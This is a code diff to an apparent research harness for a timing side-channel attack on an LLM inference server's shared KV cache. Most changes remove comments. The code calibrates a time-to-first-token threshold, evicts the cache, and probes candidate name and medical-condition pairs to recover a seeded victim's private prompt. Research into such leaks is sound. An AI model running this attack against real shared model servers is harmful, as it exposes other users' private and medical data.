@@ -70,24 +70,13 @@ from kv_attack.backends.base import BackendClient
 from kv_attack.victim_seeder import build_private_block
 
 
-# ── Vocabulary / entropy constants ────────────────────────────────────────────
 
-N_NAMES      = len(FIRST_NAMES) * len(LAST_NAMES)   # 100
-N_CONDITIONS = len(MEDICAL_CONDITIONS)               # 20
-VOCAB_SIZE   = N_NAMES * N_CONDITIONS                # 2 000
-H0_BITS      = math.log2(VOCAB_SIZE)                 # ≈ 10.97 bits
+N_NAMES      = len(FIRST_NAMES) * len(LAST_NAMES)
+N_CONDITIONS = len(MEDICAL_CONDITIONS)
+VOCAB_SIZE   = N_NAMES * N_CONDITIONS
+H0_BITS      = math.log2(VOCAB_SIZE)
 
-# Eviction parameters
-# Cache capacity: ~45,700 blocks (16 tokens each) = ~731,000 tokens
-# (DeepSeek-R1-Distill-Llama-8B on GB10 — same Llama-3.1 architecture,
-#  same KV head count, same block capacity as Llama-3.1-8B on this hardware).
-# Each eviction prompt must be FULLY UNIQUE (every block a new hash) so it actually
-# displaces cached blocks. A shared word-bank filler produces only ~2 unique blocks per
-# prompt — useless against 195,000+ contamination blocks left by prior scans.
-# Fix: generate random ASCII words per request → ~187 unique blocks per prompt.
-# 295 prompts × 187 blocks = 55,165 unique blocks > 45,700 cache blocks → full LRU cycle.
-EVICT_N_REQUESTS  = 500     # 500 × 178 unique blocks = 89,000 > 45,697 cache → 1.95× cycle
-# ── Result dataclass ──────────────────────────────────────────────────────────
+EVICT_N_REQUESTS  = 500
 
 @dataclass
 class AdaptiveReconstructionResult:
@@ -105,7 +94,6 @@ class AdaptiveReconstructionResult:
     algorithm            : str  = "linear_early_exit"
 
 
-# ── Cache eviction ────────────────────────────────────────────────────────────
 
 def evict_cache_full(backend: BackendClient, system_prefix: str) -> int:
     """
@@ -153,7 +141,6 @@ def evict_cache_full(backend: BackendClient, system_prefix: str) -> int:
     return calls
 
 
-# ── Calibration ───────────────────────────────────────────────────────────────
 
 def calibrate_threshold_backend(
     backend              : BackendClient,
@@ -190,7 +177,6 @@ def calibrate_threshold_backend(
             f"Timing gap not significant (p={p_val:.2e}). APC may be disabled."
         )
 
-    # Youden-J optimal threshold
     all_vals   = np.concatenate([hit_ttfts, miss_ttfts])
     all_labels = np.concatenate([np.ones(n_samples), np.zeros(n_samples)])
     order         = np.argsort(all_vals)
@@ -218,7 +204,6 @@ def calibrate_threshold_backend(
     }
 
 
-# ── Candidate list ────────────────────────────────────────────────────────────
 
 def _build_candidate_list(seed: int = 0) -> list[tuple[str, str]]:
     """Build and shuffle the full 2000-candidate list for one victim."""
@@ -233,7 +218,6 @@ def _build_candidate_list(seed: int = 0) -> list[tuple[str, str]]:
     return candidates
 
 
-# ── Information-theoretic metrics ─────────────────────────────────────────────
 
 def _compute_it_metrics(total_api_calls: int) -> dict:
     blq = H0_BITS / max(total_api_calls, 1)
@@ -254,7 +238,6 @@ def _compute_it_metrics(total_api_calls: int) -> dict:
     }
 
 
-# ── Main reconstruction function ──────────────────────────────────────────────
 
 def reconstruct_victim_adaptive(
     backend        : BackendClient,
@@ -298,10 +281,8 @@ def reconstruct_victim_adaptive(
     confirmed_name      = None
     confirmed_condition = None
 
-    # ── Phase A: linear scan with early exit ──────────────────────────────────
     for probe_idx, (cand_name, cand_condition) in enumerate(candidates):
 
-        # Self-eviction prevention: re-send victim prompt every RESEED_EVERY probes
         if probe_idx > 0 and probe_idx % RESEED_EVERY == 0:
             try:
                 backend.measure_ttft(reseed_prompt)
@@ -331,7 +312,6 @@ def reconstruct_victim_adaptive(
             confirmed_condition = cand_condition
             break
 
-    # Fallback: lowest TTFT if no hit found
     if confirmed_name is None:
         scan_log.sort(key=lambda x: x["mean_ttft"])
         confirmed_name      = scan_log[0]["name"]
@@ -339,7 +319,6 @@ def reconstruct_victim_adaptive(
         print(f"[reconstructor] Victim {victim_id}: no hit — "
               f"fallback to best guess '{confirmed_name}' / '{confirmed_condition}'")
 
-    # ── Phase B: confirmation ─────────────────────────────────────────────────
     dob   = dob_to_use if dob_to_use else gt["dob"]
     probe = system_prefix + " " + build_private_block(
         confirmed_name, dob, confirmed_condition
@@ -353,7 +332,6 @@ def reconstruct_victim_adaptive(
     print(f"[reconstructor] Victim {victim_id}: {status}  "
           f"ttft={conf_ttft:.1f} ms  total_calls={api_calls}")
 
-    # ── Metrics ───────────────────────────────────────────────────────────────
     recovered = {
         "name"      : confirmed_name,
         "condition" : confirmed_condition,
@@ -392,7 +370,6 @@ def reconstruct_victim_adaptive(
     )
 
 
-# ── Aggregate information-theory ──────────────────────────────────────────────
 
 def aggregate_information_theory(
     results: list[AdaptiveReconstructionResult],
